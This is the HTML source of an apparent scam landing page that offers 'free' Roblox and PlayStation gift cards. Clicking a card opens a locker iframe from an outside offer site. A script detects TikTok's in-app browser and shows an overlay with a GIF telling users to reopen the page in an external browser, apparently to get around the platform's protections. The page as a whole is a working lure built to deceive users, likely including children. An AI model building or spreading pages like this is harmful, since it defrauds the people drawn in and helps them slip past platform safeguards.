<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Premium Gift Cards</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#050505;color:#fff;overflow-x:hidden;min-height:100vh;}

/* --- OVERLAY TIKTOK --- */
#ttOverlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.98);
    display: none; /* Ghadi it-ftha ghir f TikTok browser */
    justify-content: center; 
    align-items: center; 
    flex-direction: column; 
    z-index: 999999; 
    text-align: center; 
    padding: 20px;
}
#ttOverlay h2 { font-size: 26px; font-weight: 800; margin-bottom: 10px; color: #fff; }
#ttOverlay h2 span { color: #60a5fa; }
#ttOverlay p { opacity: .7; margin-bottom: 25px; font-size: 14px; line-height: 1.4; }

.iphone-container {
    position: relative;
    width: 250px;
    height: 500px;
    background: #000;
    border-radius: 40px;
    padding: 8px;
    border: 4px solid #1a1a1a;
    box-shadow: 0 0 40px rgba(59, 130, 246, 0.3);
    overflow: hidden;
}

#tutorialGif {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 32px;
}

/* --- UI COMPONENTS --- */
.header{text-align:center;padding:34px 15px 20px}
.title{font-size:32px;font-weight:800;background:linear-gradient(90deg,#fff,#60a5fa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;padding:15px;max-width:500px;margin:auto;}
.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:12px;cursor:pointer;text-align:center;}
.card img{width:100%;height:110px;object-fit:contain;background:#fff;border-radius:15px;padding:10px;}
.name{margin-top:10px;font-weight:700;font-size:14px;}

#lockerModal{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;justify-content:center;align-items:center;z-index:9999;}
.lockerBox{width:90%;height:80%;background:#111;border-radius:15px;overflow:hidden;}
iframe{width:100%;height:100%;border:none;}
</style>
</head>

<body>

<div id="ttOverlay">
    <h2>Open in <span>Browser</span></h2>
    <p>Tap the three dots (<b>...</b>) at the top right<br>and select <b>"Open in browser"</b></p>
    <div class="iphone-container">
        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJibmtpZzRreXF6YmpxZzRreXF6YmpxZzRreXF6YmpxZzRreXF6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxxZESFf3m8/giphy.gif" id="tutorialGif" alt="Tutorial">
    </div>
</div>

<div class="header">
    <div class="title">GIFT CARDS HUB</div>
</div>

<div class="grid">
    <div class="card" onclick="goLocker()">
        <img src="https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png">
        <div class="name">ROBLOX</div>
    </div>
    <div class="card" onclick="goLocker()">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
        <div class="name">PLAYSTATION</div>
    </div>
</div>

<div id="lockerModal">
    <div class="lockerBox">
        <iframe src="https://checkmyapp.store/cl/i/pqq622"></iframe>
    </div>
</div>

<script>
    function goLocker() {
        document.getElementById("lockerModal").style.display = "flex";
    }

    window.addEventListener("load", () => {
        // Detection dyal TikTok
        const isTikTok = /TikTok|musical_ly/i.test(navigator.userAgent);
        
        if (isTikTok) {
            document.getElementById("ttOverlay").style.display = "flex";
            
            // Backup: Ila l-lien dyal l-GIF makhdamch, n-bedloh b wahed akhor sghir
            const gifImg = document.getElementById("tutorialGif");
            gifImg.onerror = function() {
                this.src = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJibmtpZzRreXF6YmpxZzRreXF6YmpxZzRreXF6YmpxZzRreXF6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/uSf0YyK6U3F3G/giphy.gif";
            };
        }
    });
</script>

</body>
</html>
